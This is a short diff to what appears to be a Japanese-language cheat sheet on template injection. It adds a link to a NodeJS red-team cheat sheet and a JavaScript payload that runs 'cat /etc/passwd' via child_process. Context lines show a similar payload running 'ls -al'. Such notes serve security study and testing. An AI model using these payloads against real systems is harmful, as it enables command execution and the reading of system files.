@@ -30,6 +30,12 @@ javascript コードを直接実行できる
 #{global.process.mainModule.require('child_process').spawnSync('ls', ['-al']).stdout}
 ```
 
+https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet
+
+```js
+arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
+```
+
 ### Smarty
 
 PHP コードを直接実行できる
